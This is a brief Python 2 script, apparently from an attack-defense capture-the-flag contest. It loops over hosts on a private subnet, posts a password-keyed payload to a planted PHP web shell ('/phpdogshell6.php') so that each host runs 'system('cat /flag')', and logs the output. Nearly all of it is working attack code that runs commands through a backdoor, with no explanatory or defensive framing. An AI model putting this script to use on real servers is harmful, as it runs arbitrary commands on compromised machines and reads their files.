#  -*- coding: utf-8 -*-

import requests
import time

url="http://192.168.137."
url1=""
shell="/phpdogshell6.php"
passwd="shell6"
port="80"
payload={passwd:'system(\'cat /flag\');'}

#f=open("webshelllist.txt","w")
#f1=open("firstroud_flag.txt","w")

filename=time.strftime('%Y-%m-%d-%H-%M-%S',time.localtime(time.time()))

filelog=open('./data/'+filename+'.txt', "wb")


for i in [86,86]:
    url1=url+str(i)+':'+port+shell
    print 'url1='+url1
    try:
        res=requests.post(url1,payload,timeout=1)
        #if res.status_code==200:
        if '404' not in res.text:
            result=url1+res.text
            print result
            filelog.write(result+'\r\n')
    except:
        print url1+"Error!"

filelog.close()

#f.close()
#f1.close()










